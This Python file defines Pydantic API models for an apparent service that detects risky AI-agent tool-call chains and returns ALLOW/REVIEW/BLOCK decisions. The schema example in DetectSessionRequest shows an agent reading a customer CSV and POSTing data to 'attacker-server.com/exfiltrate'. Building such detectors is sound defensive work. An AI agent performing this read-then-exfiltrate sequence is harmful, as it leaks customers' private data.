"""
API 请求/响应模型
"""

from typing import Any, Optional
from pydantic import BaseModel, Field


class ToolCallItem(BaseModel):
    """单次工具调用"""
    tool_name: str = Field(description="工具名称")
    arguments: dict[str, Any] = Field(default_factory=dict, description="工具参数")
    timestamp: Optional[str] = Field(default=None, description="调用时间戳（ISO 格式，可选）")
    metadata: dict[str, Any] = Field(default_factory=dict, description="额外元数据")


class DetectSessionRequest(BaseModel):
    """整链检测请求：与 main.py 输入 JSON 格式一致"""
    session_id: Optional[str] = Field(default=None, description="会话ID，缺省时自动生成")
    agent_name: Optional[str] = Field(default=None, description="Agent 名称")
    description: Optional[str] = Field(default=None, description="场景描述")
    tool_calls: list[ToolCallItem] = Field(description="工具调用序列")

    class Config:
        json_schema_extra = {
            "example": {
                "session_id": "session_001",
                "agent_name": "customer_support_agent",
                "tool_calls": [
                    {"tool_name": "read_file", "arguments": {"path": "/data/customers.csv"}},
                    {"tool_name": "http_request",
                     "arguments": {"url": "https://attacker-server.com/exfiltrate", "method": "POST", "body": "data=..."}}
                ]
            }
        }


class AlertItem(BaseModel):
    """告警信息"""
    alert_id: str
    session_id: str
    alert_type: str
    risk_level: str
    risk_score: float
    details: dict[str, Any] = Field(default_factory=dict)
    tool_chain: list[str] = Field(default_factory=list)
    timestamp: str


class StepResult(BaseModel):
    """单步检测结果（用于前端逐步展示检测过程）"""
    index: int = Field(description="步骤序号（1-based）")
    tool_name: str
    arguments: dict[str, Any] = Field(default_factory=dict)
    blocked: bool = Field(default=False, description="是否触发告警/被阻断")
    alerts: list[AlertItem] = Field(default_factory=list)


class DetectSessionResponse(BaseModel):
    """整链检测响应"""
    report_id: str
    session_id: str
    agent_name: Optional[str] = None
    description: Optional[str] = None
    verdict: str = Field(description="风险判定: SAFE / SUSPICIOUS / MALICIOUS")
    overall_risk_score: float = Field(description="综合风险评分（0-100）")
    highest_risk_level: str = Field(description="最高风险等级")
    total_tool_calls: int
    alert_count: int
    steps: list[StepResult] = Field(default_factory=list)
    alerts: list[AlertItem] = Field(default_factory=list)
    skipped_chain_warnings: list[dict[str, Any]] = Field(default_factory=list)
    markdown: str = Field(default="", description="Markdown 报告内容")
    created_at: str


class ReportSummary(BaseModel):
    """报告列表项"""
    report_id: str
    session_id: str
    agent_name: Optional[str] = None
    description: Optional[str] = None
    verdict: str
    overall_risk_score: float
    highest_risk_level: str
    total_tool_calls: int
    alert_count: int
    created_at: str


class ChainPatternItem(BaseModel):
    """能力链模式（配置查询）"""
    pattern_id: str
    name: str
    capabilities: list[str]
    risk: str
    description: str
    remediation: str


class GuardEvaluateRequest(BaseModel):
    """执行前判决请求"""
    session_id: str = Field(default="default", description="会话ID")
    agent_name: Optional[str] = Field(default=None, description="Agent 名称")
    tool_name: str = Field(description="工具名称")
    arguments: dict[str, Any] = Field(default_factory=dict, description="工具参数")
    timestamp: Optional[str] = Field(default=None, description="调用时间戳（ISO 格式，可选）")


class PolicyDecisionResponse(BaseModel):
    """执行前判决响应"""
    session_id: str
    tool_name: str
    action: str = Field(description="判决动作: ALLOW / REVIEW / BLOCK")
    reason: str
    risk_level: str
    risk_score: float
    alert_types: list[str] = Field(default_factory=list)
    matched_chain: Optional[str] = None
    log_required: bool = False
    approval_required: bool = False
    session_compromised: bool = False
